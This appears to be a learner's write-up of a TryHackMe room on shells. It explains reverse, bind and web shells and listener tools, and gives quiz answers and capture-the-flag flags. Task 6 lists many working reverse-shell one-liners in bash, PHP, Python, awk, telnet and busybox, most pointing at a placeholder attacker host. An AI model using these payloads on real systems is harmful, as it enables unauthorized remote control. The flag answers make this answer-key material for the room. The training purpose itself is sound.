# Shells Overview

## Task 1: Introduction

### Description

- Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain.
- The use of Metasploit or other Frameworks that generate or interact with shells has been intentionally left behind from this room.

## Task 2: Shell Overview

### Description

- A shell is software that allows a user to interact with an OS.
- In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software.
- Attackers execute following activities : Remote System Control, Privilege Escalation, Data Exfiltration, Persistence and Maintenance Access, Post-Exploitation Activities, Access Other Systems on the Network.

#### Question

What is the command-line interface that allows users to interact with an operating system?

#### Answer

Shell

#### Question

What process involves using a compromised system as a launching pad to attack other machines in the network?

#### Answer

Pivoting

#### Question

What is a common activity attackers perform after obtaining shell access to escalate their privileges?

#### Answer

Privilege Escalation

## Task 3: Reverse Shell

### Description

- Also called  "connect back shell", connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.
- Netcat  supports multiple OSs and allows reading and writing through a network.
- Once we have our listener set, the attacker should execute what is known as a reverse shell payload.
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Once the above payload is executed, the attacker will receive a reverse shell, allowing them to execute commands as if they were logging into a regular terminal in the OS.
  
#### Question

What type of shell allows an attacker to execute commands remotely after the target connects back?

#### Answer

Reverse Shell

#### Question

What tool is commonly used to set up a listener for a reverse shell?

#### Answer

Netcat

## Task 4: Bind Shell

### Description

- A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
  
#### Question

What type of shell opens a specific port on the target for incoming connections from the attacker?

#### Answer

Bind Shell

#### Question

Listening below which port number requires root access or privileged permissions?

#### Answer

1024

## Task 5: Shell Listeners

### Description

- Rlwrap: It is a small utility that uses the GNU readline library to provide editing keyboard and history.
- Ncat: Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
- Socat: It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

#### Question

Which flexible networking tool allows you to create a socket connection between two data sources?

#### Answer

socat

#### Question

Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?

#### Answer

rlwrap

#### Question

What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?

#### Answer

ncat

## Task 6: Shell Payloads

### Description

- A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.
- Normal Bash Reverse Shell: bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
- Bash Read Line Reverse Shell: exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
- Bash With File Descriptor 196 Reverse Shell: 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
- Bash With File Descriptor 5 Reverse Shell: bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
- PHP Reverse Shell Using the exec Function:  php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
- PHP Reverse Shell Using the shell_exec Function: php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
- PHP Reverse Shell Using the system Function:  php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
- PHP Reverse Shell Using the passthru Function: php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
- PHP Reverse Shell Using the popen Function: php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
- Python Reverse Shell by Exporting Environment Variables: export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
- Python Reverse Shell Using the subprocess Module: PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
- Short Python Reverse Shell: PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
- Telnet: TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
- AWK: awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
- BusyBox: busybox nc ATTACKER_IP 443 -e sh

#### Question

Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?

#### Answer

subprocess

#### Question

What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?

#### Answer

PHP

#### Question

Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?

#### Answer

Python

## Task 7: Web Shell

### Description

-  A web shell is usually a file containing the code that executes commands and handles files.
-  It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
-  p0wny-shell(opens in new tab) - A minimalistic single-file PHP web shell that allows remote command execution.
-  b374k shell(opens in new tab) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
-  c99 shell(opens in new tab) - A well-known and robust PHP web shell with extensive functionality

#### Question

What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?

#### Answer

Unrestricted File Upload

#### Question

What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?

#### Answer

Web Shell

## Task 8: Practical Task

#### Question

Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?

#### Answer

THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}

#### Question

Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?

#### Answer

THM{202bb14ed12120b31300cfbbbdd35998786b44e5}






